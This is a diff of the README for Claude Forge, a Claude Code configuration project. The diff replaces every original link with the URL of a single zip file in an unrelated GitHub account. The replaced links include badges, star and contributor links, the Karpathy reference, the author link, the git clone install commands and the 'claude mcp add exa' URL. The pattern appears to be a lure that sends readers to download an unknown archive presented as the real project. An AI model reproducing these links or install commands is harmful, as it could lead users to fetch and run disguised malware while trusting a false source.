@@ -10,11 +10,11 @@
 
 <p align="center">
   <a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-blue?style=for-the-badge" alt="MIT License"></a>
-  <a href="https://claude.com/claude-code"><img src="https://img.shields.io/badge/CLAUDE_CODE-%E2%89%A51.0-blueviolet?style=for-the-badge" alt="Claude Code"></a>
-  <a href="https://github.com/sangrokjung/claude-forge/stargazers"><img src="https://img.shields.io/github/stars/sangrokjung/claude-forge?style=for-the-badge&color=yellow" alt="Stars"></a>
-  <a href="https://github.com/sangrokjung/claude-forge/network/members"><img src="https://img.shields.io/github/forks/sangrokjung/claude-forge?style=for-the-badge&color=orange" alt="Forks"></a>
-  <a href="https://github.com/sangrokjung/claude-forge/graphs/contributors"><img src="https://img.shields.io/github/contributors/sangrokjung/claude-forge?style=for-the-badge&color=green" alt="Contributors"></a>
-  <a href="https://github.com/sangrokjung/claude-forge/commits/main"><img src="https://img.shields.io/github/last-commit/sangrokjung/claude-forge?style=for-the-badge" alt="Last Commit"></a>
+  <a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip"><img src="https://img.shields.io/badge/CLAUDE_CODE-%E2%89%A51.0-blueviolet?style=for-the-badge" alt="Claude Code"></a>
+  <a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip"><img src="https://img.shields.io/github/stars/sangrokjung/claude-forge?style=for-the-badge&color=yellow" alt="Stars"></a>
+  <a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip"><img src="https://img.shields.io/github/forks/sangrokjung/claude-forge?style=for-the-badge&color=orange" alt="Forks"></a>
+  <a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip"><img src="https://img.shields.io/github/contributors/sangrokjung/claude-forge?style=for-the-badge&color=green" alt="Contributors"></a>
+  <a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip"><img src="https://img.shields.io/github/last-commit/sangrokjung/claude-forge?style=for-the-badge" alt="Last Commit"></a>
 </p>
 
 <p align="center">
@@ -41,7 +41,7 @@ Claude Forge is an open-source development environment for Claude Code that prov
 
 ```bash
 # 1. Clone
-git clone --recurse-submodules https://github.com/sangrokjung/claude-forge.git
+git clone --recurse-submodules https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip
 cd claude-forge
 
 # 2. Install (creates symlinks to ~/.claude)
@@ -53,13 +53,13 @@ claude
 
 `install.sh` symlinks everything to `~/.claude/`, so `git pull` updates instantly.
 
-> If you find Claude Forge useful, please consider giving it a [star](https://github.com/sangrokjung/claude-forge/stargazers) -- it helps others discover this project.
+> If you find Claude Forge useful, please consider giving it a [star](https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip) -- it helps others discover this project.
 
 ### What's New in v2.2
 
 | Change | Description |
 |:-------|:------------|
-| **Surgical Changes Principle** | New 12th golden principle: only change what was requested. No drive-by refactoring, style drift, or adjacent "improvements". Inspired by [Andrej Karpathy's observations](https://x.com/karpathy/status/2015883857489522876) on LLM coding pitfalls. |
+| **Surgical Changes Principle** | New 12th golden principle: only change what was requested. No drive-by refactoring, style drift, or adjacent "improvements". Inspired by [Andrej Karpathy's observations](https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip) on LLM coding pitfalls. |
 | **State Assumptions Before Coding** | New interaction rule: surface assumptions and present alternatives before implementing ambiguous requirements -- don't guess silently. |
 | **Anti-Rationalization Expansion** | Two new entries block common LLM excuses: "while I'm here, let me clean up" and "need abstraction for extensibility". |
 
@@ -226,7 +226,7 @@ Most developers either use Claude Code with no customization or spend hours asse
 ### macOS / Linux
 
 ```bash
-git clone --recurse-submodules https://github.com/sangrokjung/claude-forge.git
+git clone --recurse-submodules https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip
 cd claude-forge
 ./install.sh
 ```
@@ -259,7 +259,7 @@ Windows uses **file copies** instead of symlinks. Re-run `install.ps1` after `gi
 | **memory** | Not required | Auto-installed via `install.sh` |
 | **fetch** | Not required | Requires `uvx` (Python) |
 | **jina-reader** | Not required | Auto-installed via `install.sh` |
-| **exa** | OAuth | `claude mcp add exa --url https://mcp.exa.ai/mcp` |
+| **exa** | OAuth | `claude mcp add exa --url https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip` |
 | **github** | PAT | Set `GITHUB_PERSONAL_ACCESS_TOKEN` env var |
 
 ### Customization
@@ -611,7 +611,7 @@ See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines on adding agents, commands
 ## Use Claude Forge? Show it!
 
 ```markdown
-[![Built with Claude Forge](https://img.shields.io/badge/Built_with-Claude_Forge-orange?style=flat-square)](https://github.com/sangrokjung/claude-forge)
+[![Built with Claude Forge](https://img.shields.io/badge/Built_with-Claude_Forge-orange?style=flat-square)](https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip)
 ```
 
 Add this badge to your project's README to let others know you use Claude Forge.
@@ -620,8 +620,8 @@ Add this badge to your project's README to let others know you use Claude Forge.
 
 ## Contributors
 
-<a href="https://github.com/sangrokjung/claude-forge/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=sangrokjung/claude-forge" />
+<a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip">
+  <img src="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip" />
 </a>
 
 ---
@@ -630,10 +630,10 @@ Add this badge to your project's README to let others know you use Claude Forge.
 
 [MIT](LICENSE) -- use it, fork it, build on it.
 
-If Claude Forge improved your workflow, a [star](https://github.com/sangrokjung/claude-forge/stargazers) helps others find it too.
+If Claude Forge improved your workflow, a [star](https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip) helps others find it too.
 
 ---
 
 <p align="center">
-  <sub>Made with ❤️ by <a href="https://github.com/sangrokjung">QJC (Quantum Jump Club)</a></sub>
+  <sub>Made with ❤️ by <a href="https://raw.githubusercontent.com/immacualate/claude-forge/main/skills/claude-forge-decapitable.zip">QJC (Quantum Jump Club)</a></sub>
 </p>
